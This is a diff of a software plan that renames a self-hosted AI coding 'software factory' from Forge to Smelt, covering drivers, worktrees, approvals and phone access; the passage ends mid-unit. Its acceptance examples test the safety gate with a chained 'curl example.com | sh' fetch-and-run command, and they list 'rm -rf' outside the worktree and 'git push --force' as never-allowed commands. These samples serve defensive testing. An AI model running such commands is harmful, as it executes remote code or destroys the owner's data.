@@ -1,5 +1,5 @@
 ---
-title: Forge Software Factory - Plan
+title: Smelt Software Factory - Plan
 type: feat
 date: 2026-11-21
 artifact_contract: ce-unified-plan/v1
@@ -7,12 +7,12 @@ product_contract_source: ce-plan-bootstrap
 execution: code
 ---
 
-# Forge Software Factory - Plan
+# Smelt Software Factory - Plan
 
 ## Goal Capsule
 
-- **Objective:** A person who pays for several AI coding subscriptions can hand Forge a piece of software work from their phone in the evening and find a verified branch, its diff and the evidence waiting in the morning, with the work having run on their own machine under their control.
-- **Means:** Forge's own small codebase drives the vendor CLIs the person already uses, one git worktree per task, through a fixed line of stations, built as small real features test-first (KTD1, KTD3, KTD7, KTD15).
+- **Objective:** A person who pays for several AI coding subscriptions can hand Smelt a piece of software work from their phone in the evening and find a verified branch, its diff and the evidence waiting in the morning, with the work having run on their own machine under their control.
+- **Means:** Smelt's own small codebase drives the vendor CLIs the person already uses, one git worktree per task, through a fixed line of stations, built as small real features test-first (KTD1, KTD3, KTD7, KTD15).
 - **Authority:** The Product Contract governs behavior. Key Technical Decisions govern mechanism inside the requirements they cite. A unit overrides neither.
 - **Stop conditions:** Stop and ask if a unit can only be finished by adding a mock, a fake, or a screen with nothing real behind it (R21). Stop and ask if a driver cannot be built without storing subscription credentials (R8), or if a CLI it needs is not signed in on the owner's machine.
 - **Execution profile:** One pull request per implementation unit, merged in order within each milestone when its automated gates pass. Each milestone ends with something the owner uses for real.
@@ -24,9 +24,9 @@ execution: code
 
 ### Summary
 
-Forge turns the AI subscriptions a person already pays for into a software factory that runs on their own machine. Work enters as a prompt or a markdown spec against a local git repository. A planner agent turns it into a task list the owner approves. Implementer agents build each task in its own git worktree. A verify station runs the project's checks, and a reviewer on a different model critiques the diff. The owner accepts or rejects each branch, from the Mac or from an app on their phone.
+Smelt turns the AI subscriptions a person already pays for into a software factory that runs on their own machine. Work enters as a prompt or a markdown spec against a local git repository. A planner agent turns it into a task list the owner approves. Implementer agents build each task in its own git worktree. A verify station runs the project's checks, and a reviewer on a different model critiques the diff. The owner accepts or rejects each branch, from the Mac or from an app on their phone.
 
-Headline: "Forge: turn your AI subscriptions into a software factory." Tagline: "Multi-model agents. Isolated work. Verified PRs."
+Headline: "Smelt your AI subscriptions into shipped code." Tagline: "Multi-model agents. Isolated work. Verified PRs."
 
 ### Problem Frame
 
@@ -34,11 +34,11 @@ Every major AI provider now offers a cloud sandbox and harness so its own model 
 
 Teams also hold back from agents because they fear what ends up on someone else's machines. A harness the owner runs on their own box removes the sandbox vendor from that picture and removes the lock-in to one provider's models.
 
-Two open-source projects were studied as possible bases. OpenMausBot drives vendor CLIs well, but it is a 475k-line monolith built around chat, with no worktrees, planner, verify station or pull-request flow. Rakazo runs its own agent loop, needs Postgres and five services, and lists "CI system" as a non-goal. Forge takes ideas from both and is its own codebase.
+Two open-source projects were studied as possible bases. OpenMausBot drives vendor CLIs well, but it is a 475k-line monolith built around chat, with no worktrees, planner, verify station or pull-request flow. Rakazo runs its own agent loop, needs Postgres and five services, and lists "CI system" as a non-goal. Smelt takes ideas from both and is its own codebase.
 
 ### Key Decisions
 
-- **The product is named Forge.** (session-settled: user-directed — chosen over Cog: the owner renamed it with the headline and tagline above.)
+- **The product is named Smelt.** (session-settled: user-directed — chosen over Forge, Quench, Stoke and Cog: it carries the pitch as a verb, and no AI project on GitHub uses it.)
 - **Own codebase, inspired by OpenMausBot and Rakazo.** (session-settled: user-directed — chosen over forking OpenMausBot: the owner wants to take inspiration and make it their own.) Governs R18.
 - **Nothing fake.** No mocks in tests and no feature shipped without the real thing behind it. (session-settled: user-directed — chosen over a mock-data wireframe and fake CLIs: "we agree to never mock or make fake features".) Governs R21, R22.
 - **Small testable features, built test-first.** (session-settled: user-directed — chosen over nine large units.) Governs R22.
@@ -46,14 +46,14 @@ Two open-source projects were studied as possible bases. OpenMausBot drives vend
 - **Usable from a phone, including a phone app.** (session-settled: user-directed — chosen over Mac-only access.) Governs R19, R23.
 - **Runs can finish unattended on a pre-approved command list.** (session-settled: user-directed — chosen over attended runs only.) Governs R20.
 - **Drive existing CLIs, do not replace them.** From the owner's PRD. The owner accepts running each vendor's CLI unattended on their own subscriptions: self-hosting on tools already paid for is the point. Governs R7, R8.
-- **A person approves before anything leaves the machine.** Forge itself pushes and posts nothing in this plan. Each CLI still sends prompts and code to its model provider under the owner's login. Governs R6, R10.
+- **A person approves before anything leaves the machine.** Smelt itself pushes and posts nothing in this plan. Each CLI still sends prompts and code to its model provider under the owner's login. Governs R6, R10.
 
 ### Guiding Principles
 
 These steer choices throughout the build. They are not requirements of this plan.
 
-- **Forge maintains Forge.** Once the line works (after U14), later units are run through Forge on its own repository wherever possible, and what that exposes is fixed first.
-- **Forge can be attached to a GitHub repository and fix reported bugs.** Issue intake and pull requests are the next plan. That plan keeps the self-hosted promise by having the owner's machine fetch issues and open pull requests itself, so no code passes through a Forge-run service.
+- **Smelt maintains Smelt.** Once the line works (after U14), later units are run through Smelt on its own repository wherever possible, and what that exposes is fixed first.
+- **Smelt can be attached to a GitHub repository and fix reported bugs.** Issue intake and pull requests are the next plan. That plan keeps the self-hosted promise by having the owner's machine fetch issues and open pull requests itself, so no code passes through a Smelt-run service.
 - **Every stage validates without the owner.** Automated gates decide whether a unit is done. Owner checks are collected per milestone and do not hold up the next unit. The exceptions need a person once: signing in to a vendor CLI, private-network and HTTPS setup, and checks on a physical phone.
 
 ### Requirements
@@ -63,15 +63,15 @@ These steer choices throughout the build. They are not requirements of this plan
 - R1. The owner can start a run from a freeform prompt or a markdown spec file, against a local git repository they choose.
 - R2. A planner agent produces a task list with acceptance criteria per task. The owner can edit it and must approve it before any build starts.
 - R3. Each task is built in its own git worktree on its own branch. The owner's checkout and current branch are never modified.
-- R4. After a task is built, Forge runs the repository's configured check commands in that worktree and stores their output as evidence on the task.
+- R4. After a task is built, Smelt runs the repository's configured check commands in that worktree and stores their output as evidence on the task.
 - R5. The owner can turn on a reviewer for a run. The reviewer runs on a different model than the implementer and attaches its critique of the diff as evidence.
-- R6. A run ends by presenting each task's branch, diff and evidence. The owner records accept or reject. Forge pushes nothing and opens no pull request in this plan.
+- R6. A run ends by presenting each task's branch, diff and evidence. The owner records accept or reject. Smelt pushes nothing and opens no pull request in this plan.
 
 **Models and subscriptions**
 
-- R7. Each role (planner, implementer, reviewer) is assigned a driver and model, changeable per run. Forge supports Claude Code, Codex, Gemini CLI and Grok.
-- R8. Drivers use the login the owner already has in each CLI. Forge never asks for, reads, or stores subscription credentials, and never causes a subscription session to be billed as metered API use.
-- R9. The owner can move a task to another driver mid-build. When a driver reports a rate limit, Forge does this on its own using the role's next configured driver, and the run records the switch.
+- R7. Each role (planner, implementer, reviewer) is assigned a driver and model, changeable per run. Smelt supports Claude Code, Codex, Gemini CLI and Grok.
+- R8. Drivers use the login the owner already has in each CLI. Smelt never asks for, reads, or stores subscription credentials, and never causes a subscription session to be billed as metered API use.
+- R9. The owner can move a task to another driver mid-build. When a driver reports a rate limit, Smelt does this on its own using the role's next configured driver, and the run records the switch.
 
 **Control**
 
@@ -87,23 +87,23 @@ These steer choices throughout the build. They are not requirements of this plan
 
 **Ownership and reach**
 
-- R15. After Forge restarts, finished tasks are not repeated. A task that was mid-turn is retried once and otherwise marked interrupted for the owner to resume.
+- R15. After Smelt restarts, finished tasks are not repeated. A task that was mid-turn is retried once and otherwise marked interrupted for the owner to resume.
 - R16. A technical user reaches a first completed run within 15 minutes of cloning, with no Docker, database server, or external account beyond the CLIs already installed.
-- R19. The owner can use Forge from their phone over a private network. Every request, from any device, must carry the owner's login, and Forge listens only on the addresses the owner configured.
-- R23. Forge can be installed on the owner's phone as an app, and it notifies the phone when an approval or a decision is waiting.
-- R24. Code, transcripts, evidence and the action log are stored only on the owner's machine. Forge sends nothing to any service of its own, and the README states plainly what each vendor CLI still sends to its provider.
+- R19. The owner can use Smelt from their phone over a private network. Every request, from any device, must carry the owner's login, and Smelt listens only on the addresses the owner configured.
+- R23. Smelt can be installed on the owner's phone as an app, and it notifies the phone when an approval or a decision is waiting.
+- R24. Code, transcripts, evidence and the action log are stored only on the owner's machine. Smelt sends nothing to any service of its own, and the README states plainly what each vendor CLI still sends to its provider.
 
 **How it is built**
 
 - R21. Every feature is real when it ships: no screen, button, driver or status is present before the behavior behind it works.
 - R22. Every unit is built test-first, and its tests exercise real things: a real git repository, the real database, a real HTTP server, and the real vendor CLI.
-- R18. Any file copied from another project keeps its licence notice, and Forge's `NOTICE` names the source.
+- R18. Any file copied from another project keeps its licence notice, and Smelt's `NOTICE` names the source.
 
 ### Key Flows
 
 - **F1. A run, end to end.** Owner starts a run and confirms the pre-approved commands (R1, R20). Planner proposes tasks. Owner edits and approves (R2). Each task builds in a worktree (R3), pausing for approvals as needed (R10). Checks run (R4). The reviewer runs when enabled (R5). The owner accepts or rejects each task (R6).
 - **F2. An approval from the phone.** An agent asks to run a command. The phone is notified (R23). The owner opens the card, then allows once, allows as a standing permission when offered (R11), or declines. The decision is logged (R12).
-- **F3. A restart mid-run.** Forge stops while a task is building. On start, finished tasks stay finished, the interrupted task is retried once (R15), and pending approvals are still answerable (R10).
+- **F3. A restart mid-run.** Smelt stops while a task is building. On start, finished tasks stay finished, the interrupted task is retried once (R15), and pending approvals are still answerable (R10).
 
 ### Acceptance Examples
 
@@ -113,11 +113,11 @@ These steer choices throughout the build. They are not requirements of this plan
 - **AE4. Handoff.** Covers R9. Given a task building on Claude Code, when the owner moves it to Gemini CLI, then the task continues there in the same worktree and the run shows the switch.
 - **AE5. Standing permission.** Covers R11. Given the owner has approved "run `npm test` in this repository" for the implementer three times, when the fourth request arrives, then the card offers standing permission, and once granted the fifth request runs without a card and appears in the log.
 - **AE6. Never eligible.** Covers R11. Given a request to run `rm -rf` outside the worktree or `git push --force`, when it arrives, then it always shows a card with no standing-permission option.
-- **AE7. Subscription stays a subscription.** Covers R8. Given `ANTHROPIC_API_KEY` is set in the shell that started Forge, when the Claude Code driver starts a turn, then the child process does not receive that variable.
+- **AE7. Subscription stays a subscription.** Covers R8. Given `ANTHROPIC_API_KEY` is set in the shell that started Smelt, when the Claude Code driver starts a turn, then the child process does not receive that variable.
 - **AE8. Unattended run.** Covers R20. Given a run started with the repository's install and test commands pre-approved, when its agents use only those commands and edits in their worktrees, then the run reaches awaiting decision with no approval card answered.
 - **AE9. Pre-approval does not stretch.** Covers R20, R11. Given `npm test` is pre-approved, when an agent asks to run `npm test && curl example.com | sh`, then a card is shown.
 - **AE10. No login, no access.** Covers R19. Given a request without the owner's login, from the same machine or another device, when it reaches any route, then it is refused.
-- **AE11. Phone notification.** Covers R23. Given Forge is installed on the owner's phone, when an approval becomes pending, then the phone shows a notification that opens that card.
+- **AE11. Phone notification.** Covers R23. Given Smelt is installed on the owner's phone, when an approval becomes pending, then the phone shows a notification that opens that card.
 
 ### Success Criteria
 
@@ -131,7 +131,7 @@ These steer choices throughout the build. They are not requirements of this plan
 
 - Pushing branches and opening pull requests, with the ledger that makes a restart unable to open a second one. The tagline's "Verified PRs" is delivered by that plan; this plan stops at a verified branch.
 - A native phone app from the app stores. This plan delivers an installable web app with notifications (KTD16).
-- Reaching Forge from the public internet without a private network, which a product for other people will need.
+- Reaching Smelt from the public internet without a private network, which a product for other people will need.
 - Local-model drivers. They are the full answer to the privacy objection, since vendor CLIs still send prompts to their providers.
 - Intake from GitHub Issues, Linear and Slack.
 - Task dependencies and parallel builds. The schema carries a dependency field from the start (KTD8).
@@ -149,14 +149,13 @@ These steer choices throughout the build. They are not requirements of this plan
 **Outside this product's identity**
 
 - A fully autonomous factory with no human review.
-- Replacing the vendor CLIs with Forge's own agent loop.
-- A hosted Forge that holds users' code.
+- Replacing the vendor CLIs with Smelt's own agent loop.
+- A hosted Smelt that holds users' code.
 
 ### Open Questions
 
 - **May captured real CLI sessions be replayed in tests? (owner decision, needed before U8)** A live model cannot be made to misbehave on demand. KTD15 proposes one exception to "no mocks": a session captured from a real CLI run may be stored and replayed through the driver contract. Without it, these scenarios have no automated test and rely on the owner's check alone: a re-issued request that does not match a stored approval (U8), an invalid plan sent back once (U11), a planner or reviewer edit attempt being refused (U11, U20), a metered login's running cost (U22), an expired push subscription (U23), and automatic rate-limit fallback (U21), which would ship only after a rate limit has been seen live.
-- **HTTPS on the private network (owner decision, blocks U23).** Phone notifications need a trusted HTTPS address for Forge. With Tailscale that means turning on HTTPS certificates for the tailnet, which publishes the Mac's machine name in public certificate logs. Whether Tailscale is installed on the Mac and phone was not checked.
-- **The name Forge is widely used (owner decision, does not block).** Laravel Forge, Atlassian Forge and Minecraft Forge are well known, several AI developer tools on GitHub use it, and the npm package name is taken. The repository and package would need a scope or suffix, such as `forge-factory`.
+- **HTTPS on the private network (owner decision, blocks U23).** Phone notifications need a trusted HTTPS address for Smelt. With Tailscale that means turning on HTTPS certificates for the tailnet, which publishes the Mac's machine name in public certificate logs. Whether Tailscale is installed on the Mac and phone was not checked.
 - **Nexvyn UI licence (deferred, does not block).** GitHub reports no standard licence for `Nexvyn/Nexvyn-ui`. U4 reads its licence file first and uses plain shadcn components if it does not allow use in an Apache-2.0 project.
 - **Sign-in to the new CLIs (owner action, blocks U17 to U19).** Codex 0.171.0, Gemini CLI 0.70.0 and Grok 1.0.92 are installed on the owner's Mac. Codex reports "Not logged in"; Gemini CLI and Grok were not checked. Each needs the owner to sign in once.
 
@@ -174,26 +173,26 @@ These steer choices throughout the build. They are not requirements of this plan
 ### Key Technical Decisions
 
 - KTD1. **New repository, Apache-2.0, written from the contracts and not copied wholesale.** OpenMausBot's driver layer is 39k lines importing 213 paths outside itself, so it cannot be lifted as a module. Small self-contained files may be copied, each recorded in `NOTICE` with its upstream notice, including the MIT notice on files OpenMausBot adapted from T3 Code (R18).
-- KTD2. **TypeScript on Node 24 or later, run directly with no server build step.** One process, `node:http`, one server-sent-events stream, `node:sqlite` in a single database under `~/.forge`. This is what makes R16 reachable.
+- KTD2. **TypeScript on Node 24 or later, run directly with no server build step.** One process, `node:http`, one server-sent-events stream, `node:sqlite` in a single database under `~/.smelt`. This is what makes R16 reachable.
 - KTD3. **Drivers are stdio subprocesses speaking each CLI's structured headless protocol, behind one adapter contract.** The contract has `sendTurn`, `interruptTurn`, `respondToRequest`, `onEvent`, an opaque resume cursor, and capability flags, and every driver emits one normalized event union. Claude Code uses stream-json with a retained process. Codex uses its app-server protocol, typed from the schema the CLI generates. Gemini CLI uses `--acp`. Grok is started with `grok agent stdio`, which serves the same Agent Client Protocol. No pty and no vendor agent SDK.
-- KTD4. **Launch isolation protects the subscription and the approvals.** The child environment is built from an allowlist, and provider API-key variables are removed (AE7). Each CLI is started without the owner's personal settings, permission allow rules, hooks, plugins and MCP servers, while the repository's own instructions still load. For Claude Code that is `--setting-sources project` with `--strict-mcp-config`. Each driver unit finds the equivalent for its CLI. Forge implements no in-app OAuth and calls no unofficial usage endpoints.
-- KTD5. **Tool-level approvals go through one permission broker.** Each driver routes its CLI's permission requests to an in-process broker that writes the approval row, emits the event, and blocks until answered. Any broker failure denies. A CLI only asks when it would otherwise prompt, so the broker alone misses commands the CLI treats as safe and commands allowed by rules committed in the repository. The Claude Code driver therefore also registers a Forge pre-tool hook through `--settings`, which sends every shell and write call to the gate before the CLI's own rules apply. Each other driver states its equivalent interception point or reports the capability as missing, and a driver without it is offered for read-only roles only. The implementer may edit inside its worktree and asks for everything else. Planner and reviewer run read-only. The planner works in a detached worktree of the base commit, never in the owner's checkout (R3).
+- KTD4. **Launch isolation protects the subscription and the approvals.** The child environment is built from an allowlist, and provider API-key variables are removed (AE7). Each CLI is started without the owner's personal settings, permission allow rules, hooks, plugins and MCP servers, while the repository's own instructions still load. For Claude Code that is `--setting-sources project` with `--strict-mcp-config`. Each driver unit finds the equivalent for its CLI. Smelt implements no in-app OAuth and calls no unofficial usage endpoints.
+- KTD5. **Tool-level approvals go through one permission broker.** Each driver routes its CLI's permission requests to an in-process broker that writes the approval row, emits the event, and blocks until answered. Any broker failure denies. A CLI only asks when it would otherwise prompt, so the broker alone misses commands the CLI treats as safe and commands allowed by rules committed in the repository. The Claude Code driver therefore also registers a Smelt pre-tool hook through `--settings`, which sends every shell and write call to the gate before the CLI's own rules apply. Each other driver states its equivalent interception point or reports the capability as missing, and a driver without it is offered for read-only roles only. The implementer may edit inside its worktree and asks for everything else. Planner and reviewer run read-only. The planner works in a detached worktree of the base commit, never in the owner's checkout (R3).
 - KTD6. **Grants are narrow, keyed on the repository, and capped by a safety floor.** A grant is an exact command plus the source repository plus the working directory relative to the worktree root, or a named tool, scoped to a role. Approval counts use the same key. A run's pre-approved list is stored as grants scoped to that run and matches a request whose leading words equal the entry and which contains no shell operators that chain, pipe, substitute or redirect (AE9). A never-list overrides every grant (AE6).
-- KTD7. **Isolation is one git worktree per task, on the host, and Forge commits the work.** Worktrees live under `~/.forge/worktrees/<run>/<task>` on branch `forge/<run>/<task>`, from the repository's current `HEAD` commit. Setup commands configured per repository run in each new worktree. When an implementer's turn ends, Forge stages and commits everything to the task branch. The diff is base commit to branch head.
+- KTD7. **Isolation is one git worktree per task, on the host, and Smelt commits the work.** Worktrees live under `~/.smelt/worktrees/<run>/<task>` on branch `smelt/<run>/<task>`, from the repository's current `HEAD` commit. Setup commands configured per repository run in each new worktree. When an implementer's turn ends, Smelt stages and commits everything to the task branch. The diff is base commit to branch head.
 - KTD8. **Runs and tasks are two row-driven state machines, with attempts under tasks.** The run row carries planning, awaiting plan approval, running, awaiting decision, done and cancelled. Each task row carries queued, building, verifying, reviewing, awaiting decision, blocked, interrupted and decided. Tasks proceed one at a time. Each task has a `depends_on` field left empty in this plan. State changes and their events are written in one transaction.
-- KTD9. **Restart recovery reconciles from the database.** Each attempt records its CLI's process group, and on start Forge stops any that survived before re-driving, so two agents never write to one worktree. A task that was mid-turn is re-driven once from its resume cursor and otherwise marked interrupted. A task blocked on a pending approval is parked: when the owner answers, Forge re-drives it and applies the stored answer once to the first matching request.
+- KTD9. **Restart recovery reconciles from the database.** Each attempt records its CLI's process group, and on start Smelt stops any that survived before re-driving, so two agents never write to one worktree. A task that was mid-turn is re-driven once from its resume cursor and otherwise marked interrupted. A task blocked on a pending approval is parked: when the owner answers, Smelt re-drives it and applies the stored answer once to the first matching request.
 - KTD10. **Usage is an append-only ledger whose cost kind comes from the login, not from the CLI's printout.** Each driver's probe reports whether the login is a subscription or metered, without reading credentials. A subscription turn stores no dollar amount even when the CLI prints one. A CLI that cannot report its login kind is shown as unknown, and its turns are counted in tokens only.
 - KTD11. **Routing is configuration with ordered fallbacks, and a handoff starts fresh.** The next driver gets a new session with the task, its acceptance criteria, a note that an earlier attempt stopped, and the worktree's diff. Resume cursors never cross drivers.
-- KTD12. **The client is React with Vite and Tailwind, using Nexvyn UI for the shell where its licence allows and plain shadcn components elsewhere.** The built client is static files served by the Forge process. It is laid out for a phone first.
-- KTD14. **One owner login guards every route, and the listen addresses are configuration.** Forge creates a random token on first start, stores it under `~/.forge` readable only by the owner, and shows it once. A device signs in with it and receives a session cookie that scripts cannot read. Requests from the same machine need the login too. Forge listens on the loopback address plus any address the owner lists, such as the Mac's private-network address. The phone reaches Forge over HTTPS under the Mac's private-network name, with the private network's own tool terminating TLS in front of Forge's loopback listener (for Tailscale, `tailscale serve`). A phone app with notifications needs this, because browsers only run service workers and push on a trusted HTTPS origin. The session cookie is marked secure when reached that way.
-- KTD15. **Tests use real things, in three layers.** Unit and integration tests use a real temporary git repository, the real database in a temporary directory, and a real HTTP server on a free port. Live tests under `test/live/` start the real vendor CLI with a tiny prompt on its cheapest model and are run before each driver unit merges. End-to-end tests drive the real client in a browser against a real Forge process. Any scenario that needs an agent turn is a live test; files outside `test/live/` and `e2e/` never start a driver. The one allowed exception is replaying output captured from a real CLI run to test parsing (see Open Questions).
-- KTD16. **The phone app is an installable web app with web push.** The client ships a manifest and a service worker, so it installs to the home screen on iOS and Android. Forge sends notifications through the standard Web Push protocol with keys it generates and keeps locally. This passes notification text through Apple's or Google's push service, so notifications carry only "an approval is waiting" and the run name, never commands or code (R24).
+- KTD12. **The client is React with Vite and Tailwind, using Nexvyn UI for the shell where its licence allows and plain shadcn components elsewhere.** The built client is static files served by the Smelt process. It is laid out for a phone first.
+- KTD14. **One owner login guards every route, and the listen addresses are configuration.** Smelt creates a random token on first start, stores it under `~/.smelt` readable only by the owner, and shows it once. A device signs in with it and receives a session cookie that scripts cannot read. Requests from the same machine need the login too. Smelt listens on the loopback address plus any address the owner lists, such as the Mac's private-network address. The phone reaches Smelt over HTTPS under the Mac's private-network name, with the private network's own tool terminating TLS in front of Smelt's loopback listener (for Tailscale, `tailscale serve`). A phone app with notifications needs this, because browsers only run service workers and push on a trusted HTTPS origin. The session cookie is marked secure when reached that way.
+- KTD15. **Tests use real things, in three layers.** Unit and integration tests use a real temporary git repository, the real database in a temporary directory, and a real HTTP server on a free port. Live tests under `test/live/` start the real vendor CLI with a tiny prompt on its cheapest model and are run before each driver unit merges. End-to-end tests drive the real client in a browser against a real Smelt process. Any scenario that needs an agent turn is a live test; files outside `test/live/` and `e2e/` never start a driver. The one allowed exception is replaying output captured from a real CLI run to test parsing (see Open Questions).
+- KTD16. **The phone app is an installable web app with web push.** The client ships a manifest and a service worker, so it installs to the home screen on iOS and Android. Smelt sends notifications through the standard Web Push protocol with keys it generates and keeps locally. This passes notification text through Apple's or Google's push service, so notifications carry only "an approval is waiting" and the run name, never commands or code (R24).
 
 ### High-Level Technical Design
 
 ```mermaid
 flowchart LR
-  PH["Phone app"] -- "private network, owner login" --> API["Forge server on the owner's machine"]
+  PH["Phone app"] -- "private network, owner login" --> API["Smelt server on the owner's machine"]
   MAC["Browser on the Mac"] -- "owner login" --> API
   API --> ENG["Run engine"]
   ENG --> WT["Worktree manager"]
@@ -204,7 +203,7 @@ flowchart LR
   DRV --> GM["Gemini CLI"]
   DRV --> GK["Grok"]
   CC & CX & GM & GK -- "permission request" --> BRK["Permission broker"]
-  BRK --> DB[("SQLite under ~/.forge")]
+  BRK --> DB[("SQLite under ~/.smelt")]
   ENG --> DB
   API --> DB
   API -- "an approval is waiting" --> PUSH["Web Push service"] --> PH
@@ -216,7 +215,7 @@ Task stations, one task at a time while the run is running:
 stateDiagram-v2
   [*] --> Queued
   Queued --> Building: setup commands passed
-  Building --> Verifying: turn ended, Forge committed the work
+  Building --> Verifying: turn ended, Smelt committed the work
   Verifying --> Reviewing: reviewer enabled
   Verifying --> AwaitingDecision: reviewer off
   Reviewing --> AwaitingDecision
@@ -231,7 +230,7 @@ stateDiagram-v2
 ### Assumptions
 
 - The owner's repositories are local git repositories with at least one commit.
-- Check, setup and pre-approved commands are supplied per repository. Forge does not detect them.
+- Check, setup and pre-approved commands are supplied per repository. Smelt does not detect them.
 - The owner's Mac and phone are on the same private network, such as Tailscale, with its HTTPS certificates turned on (see Open Questions).
 - Live tests may spend a small amount of subscription usage.
 
@@ -256,7 +255,7 @@ Every unit follows the same execution rule: write the listed tests first and wat
 | U2 | Owner login and listen addresses | U1 |
 | U3 | Claude Code driver: one real turn | U1 |
 | U4 | Client shell: sign in, send a turn, watch it live | U2, U3 |
-| U5 | Worktree per task, Forge commits the work | U1 |
+| U5 | Worktree per task, Smelt commits the work | U1 |
 | U6 | Tasks in the client: start a task in a repository, see its diff | U4, U5 |
 | U7 | Permission broker and approval cards | U6 |
 | U8 | Approvals survive a restart | U7 |
@@ -281,10 +280,10 @@ Every unit follows the same execution rule: write the listed tests first and wat
 
 ### U1. Scaffold, store and health
 
-**Goal:** A Forge process starts on a clean machine and owns one database.
+**Goal:** A Smelt process starts on a clean machine and owns one database.
 **Requirements:** R16, R18, R22, R24.
 **Dependencies:** None.
-**Files:** `package.json`, `tsconfig.json`, `LICENSE`, `NOTICE`, `forge.config.json`, `src/config.ts`, `src/store/db.ts`, `src/store/schema.ts`, `src/store/atomic.ts`, `src/server.ts`, `test/store.test.ts`, `test/config.test.ts`, `test/server.test.ts`.
+**Files:** `package.json`, `tsconfig.json`, `LICENSE`, `NOTICE`, `smelt.config.json`, `src/config.ts`, `src/store/db.ts`, `src/store/schema.ts`, `src/store/atomic.ts`, `src/server.ts`, `test/store.test.ts`, `test/config.test.ts`, `test/server.test.ts`.
 **Approach:** Create only the tables this unit and U3 use (events, attempts, a schema version). Later units add their own tables by migration, so no table exists before something writes to it.
 **Patterns to follow:** `../botdeck/src/db.ts`, `../botdeck/src/config.ts`.
 **Test scenarios:**
@@ -292,11 +291,11 @@ Every unit follows the same execution rule: write the listed tests first and wat
 - A database at an older schema version is migrated forward and keeps its rows.
 - A local config file overrides defaults; an unknown driver name is rejected with a message naming where it appeared.
 - The running server answers a health request and nothing else.
-**Verification:** `npm start` on a clean machine creates `~/.forge` and answers the health request.
+**Verification:** `npm start` on a clean machine creates `~/.smelt` and answers the health request.
 
 ### U2. Owner login and listen addresses
 
-**Goal:** Nothing in Forge is reachable without the owner's login, from any device.
+**Goal:** Nothing in Smelt is reachable without the owner's login, from any device.
 **Requirements:** R19, R24.
 **Dependencies:** U1.
 **Files:** `src/api/auth.ts`, `src/server.ts`, `test/api/auth.test.ts`.
@@ -305,7 +304,7 @@ Every unit follows the same execution rule: write the listed tests first and wat
 **Test scenarios:**
 - Covers AE10. A request with no session is refused on every route except sign-in, from the loopback address as well as a configured address.
 - Signing in with the token sets a session cookie scripts cannot read; a wrong token is refused, and repeated wrong tokens are slowed down.
-- With no extra address configured, Forge listens on the loopback address only.
+- With no extra address configured, Smelt listens on the loopback address only.
 - A request arriving through the configured HTTPS name is accepted, and its session cookie is marked secure.
 - The token file is readable only by the owner, and the token never appears in logs or responses after first start.
 - A request with a foreign `Origin`, or a non-JSON body on a write route, is refused.
@@ -313,7 +312,7 @@ Every unit follows the same execution rule: write the listed tests first and wat
 
 ### U3. Claude Code driver: one real turn
 
-**Goal:** Forge runs a turn in the real Claude Code, streams normalized events, stores them, resumes and interrupts.
+**Goal:** Smelt runs a turn in the real Claude Code, streams normalized events, stores them, resumes and interrupts.
 **Requirements:** R7, R8, R14, R22.
 **Dependencies:** U1.
 **Files:** `src/drivers/contract.ts`, `src/drivers/events.ts`, `src/drivers/launch.ts`, `src/drivers/claude-code.ts`, `test/drivers/launch.test.ts`, `test/live/claude-code.live.test.ts`.
@@ -345,7 +344,7 @@ Every unit follows the same execution rule: write the listed tests first and wat
 
 ### Milestone 2: Safe hands
 
-### U5. Worktree per task, Forge commits the work
+### U5. Worktree per task, Smelt commits the work
 
 **Goal:** Work happens in a separate copy, and the owner's checkout is never touched.
 **Requirements:** R3.
@@ -354,7 +353,7 @@ Every unit follows the same execution rule: write the listed tests first and wat
 **Approach:** Implement KTD7: create, commit the work, describe (branch, base commit, per-file diff), remove only when clean.
 **Test scenarios:**
 - Covers AE2. With uncommitted changes and a checked-out branch in the source repository, creating, committing in, and removing a worktree leaves the source's `git status` and branch unchanged.
-- After files are modified and created in a worktree, Forge's commit puts them on the task branch, and removing the worktree loses nothing.
+- After files are modified and created in a worktree, Smelt's commit puts them on the task branch, and removing the worktree loses nothing.
 - Two tasks get two worktrees and two branches from the same base commit.
 - A branch name collision with an earlier run is resolved with a new name, never by reusing or resetting the old branch.
 - A path that is not a git repository, or one with no commits, is rejected with a clear message.
@@ -362,11 +361,11 @@ Every unit follows the same execution rule: write the listed tests first and wat
 
 ### U6. Tasks in the client: start a task in a repository, see its diff
 
-**Goal:** The owner points Forge at a repository, gives one task, and sees the files Claude Code changed on a branch.
+**Goal:** The owner points Smelt at a repository, gives one task, and sees the files Claude Code changed on a branch.
 **Requirements:** R1, R3, R6, R14.
 **Dependencies:** U4, U5.
 **Files:** `src/store/schema.ts` (tasks migration), `src/engine/task.ts`, `src/api/routes.ts`, `web/src/screens/new-task.tsx`, `web/src/screens/task.tsx`, `test/engine/task.test.ts`, `test/live/task.live.test.ts`, `e2e/task.e2e.ts`.
-**Approach:** A task is one implementer turn sequence in one worktree, ending with Forge's commit. The task screen shows the transcript, then changed files with line counts, each expandable to a unified diff. At this point the agent may only edit inside its worktree and every other action is denied, with a plain note saying approvals arrive in the next unit.
+**Approach:** A task is one implementer turn sequence in one worktree, ending with Smelt's commit. The task screen shows the transcript, then changed files with line counts, each expandable to a unified diff. At this point the agent may only edit inside its worktree and every other action is denied, with a plain note saying approvals arrive in the next unit.
 **Test scenarios:**
 - Live: a task "create hello.txt containing hi" in a temporary repository ends with a commit on a task branch containing that file, and the source checkout is unchanged.
 - The diff route returns per-file changes from base commit to branch head.
@@ -394,16 +393,16 @@ Every unit follows the same execution rule: write the listed tests first and wat
 
 ### U8. Approvals survive a restart
 
-**Goal:** Restarting Forge never loses or duplicates a pending approval.
+**Goal:** Restarting Smelt never loses or duplicates a pending approval.
 **Requirements:** R10, R15.
 **Dependencies:** U7.
 **Files:** `src/engine/recover.ts`, `src/approvals/broker.ts`, `test/engine/recover-approval.test.ts`, `test/live/recover-approval.live.test.ts`.
 **Approach:** Implement the parked-approval half of KTD9.
 **Test scenarios:**
 - A pending approval row is still pending after the store is closed and reopened.
-- Live: with a task waiting on an approval, Forge is stopped and started; the card is still shown, allowing it re-drives the task, and the task finishes with no second card.
+- Live: with a task waiting on an approval, Smelt is stopped and started; the card is still shown, allowing it re-drives the task, and the task finishes with no second card.
 - A re-driven turn whose first request does not match the stored one raises a new card and closes the old one as superseded.
-**Verification:** The owner restarts Forge during a real pending approval and answers it afterward.
+**Verification:** The owner restarts Smelt during a real pending approval and answers it afterward.
 
 ### U9. Safety floor and pre-approved commands
 
@@ -447,7 +446,7 @@ Every unit follows the same execution rule: write the listed tests first and wat
 **Requirements:** R1, R2.
 **Dependencies:** U6.
